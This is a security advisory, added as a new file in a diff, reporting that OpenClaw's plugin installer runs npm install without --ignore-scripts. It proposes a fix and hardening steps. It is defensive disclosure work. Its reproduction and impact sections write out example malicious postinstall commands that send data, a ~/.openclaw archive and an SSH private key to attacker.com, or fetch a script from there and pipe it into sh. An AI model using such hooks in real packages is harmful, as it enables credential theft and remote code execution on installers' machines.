@@ -1,0 +1,135 @@
+ADVISORY #2: NPM Install Executes Untrusted Lifecycle Scripts
+
+========================================
+TITLE:
+========================================
+NPM Install Executes Untrusted Lifecycle Scripts During Plugin Installation
+
+========================================
+SEVERITY ASSESSMENT:
+========================================
+High - Remote code execution via supply chain attack
+
+MITRE ATLAS Mapping:
+- T-ACCESS-004: Malicious Skill as Entry Point (Critical)
+- T-EXEC-005: Malicious Skill Code Execution (Critical)
+- Part of "Malicious Skill Full Kill Chain"
+
+========================================
+IMPACT:
+========================================
+Plugin installation runs `npm install` without `--ignore-scripts`, allowing arbitrary code execution through `preinstall`, `postinstall`, and other lifecycle scripts in malicious or compromised dependencies. An attacker can achieve remote code execution on the gateway host by publishing a malicious plugin or compromising a dependency.
+
+Impact includes:
+- Remote Code Execution: Arbitrary commands run as gateway user during install
+- Credential Theft: Access to gateway config, API keys, session data
+- Persistence: Malicious scripts can modify system files, add backdoors
+- Supply Chain Compromise: Single malicious transitive dependency affects all installations
+
+========================================
+AFFECTED COMPONENT:
+========================================
+- File: `src/plugins/install.ts`
+- Lines: 277-284
+- Component: Plugin installation handler
+- Versions: Current HEAD (as of 2026-02-10)
+
+========================================
+TECHNICAL REPRODUCTION:
+========================================
+Steps:
+1. Create a malicious plugin with dependency containing malicious `postinstall` script
+2. Publish to npm registry (or host locally)
+3. Install plugin via OpenClaw: `openclaw plugins install <malicious-plugin>`
+4. Observe arbitrary code execution during `npm install` phase
+
+Code Location (src/plugins/install.ts:277-284):
+```typescript
+const npmRes = await runCommandWithTimeout(
+  ["npm", "install", "--omit=dev", "--silent"], 
+  {
+    timeoutMs: Math.max(timeoutMs, 300_000),
+    cwd: targetDir,
+  }
+);
+```
+
+Example Malicious Package:
+```json
+{
+  "name": "malicious-dep",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://attacker.com/exfil?data=$(whoami)@$(hostname) || wget -O- https://attacker.com/payload | sh"
+  }
+}
+```
+
+========================================
+DEMONSTRATED IMPACT:
+========================================
+Attack Scenarios:
+1. Malicious Plugin Direct: Attacker publishes plugin with malicious postinstall script
+2. Dependency Compromise: Legitimate plugin depends on compromised package
+3. Typosquatting: Similar-named malicious packages targeting OpenClaw ecosystem
+
+Concrete Examples:
+- Credential exfiltration: `postinstall: "tar czf - ~/.openclaw | curl -F 'data=@-' https://attacker.com/exfil"`
+- Backdoor installation: `postinstall: "curl https://attacker.com/backdoor.sh | sh"`
+- SSH key theft: `postinstall: "curl -F 'keys=@~/.ssh/id_rsa' https://attacker.com/keys"`
+
+========================================
+ENVIRONMENT:
+========================================
+- OpenClaw Version: HEAD (commit from 2026-02-10)
+- Repository: github.com/openclaw/openclaw
+- Platform: All platforms running OpenClaw gateway
+- Node.js: 22.12.0+
+- Attack Vector: Plugin installation (CLI or programmatic)
+
+========================================
+REMEDIATION ADVICE:
+========================================
+Recommended Fix:
+Add `--ignore-scripts` flag to all `npm install` invocations:
+
+```typescript
+const npmRes = await runCommandWithTimeout(
+  ["npm", "install", "--omit=dev", "--silent", "--ignore-scripts"],
+  {
+    timeoutMs: Math.max(timeoutMs, 300_000),
+    cwd: targetDir,
+  }
+);
+```
+
+Defense in Depth:
+1. Sandboxing: Run plugin installs in isolated container with no network access
+2. Allowlisting: Maintain curated list of verified plugins (ClawHub)
+3. Audit Logging: Log all plugin installs with dependency tree snapshot
+4. User Consent: Warn users about lifecycle scripts if `--ignore-scripts` breaks functionality
+5. Lockfile Verification: Require `package-lock.json` and verify integrity
+
+Breaking Change Considerations:
+Some legitimate packages require lifecycle scripts (native modules, etc.). If backward compatibility is needed:
+1. Default to `--ignore-scripts`
+2. Add `--allow-scripts` flag for advanced users
+3. Document security implications clearly
+
+Testing:
+Add test cases ensuring:
+- Plugin installs do not execute lifecycle scripts by default
+- Malicious postinstall scripts are blocked
+- Installation succeeds for legitimate plugins without scripts
+
+Integration with ClawHub:
+- Add lifecycle script scanning to ClawHub review process
+- Flag plugins requiring scripts for manual review
+- Display warnings to users installing plugins with scripts
+
+CWE: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
+OWASP: A08:2021 – Software and Data Integrity Failures
+Related CVE: CVE-2021-23568 (similar npm script execution issues)
+
+Reporter: Clawdine (ClawdSure security audit)
+Date: 2026-02-10
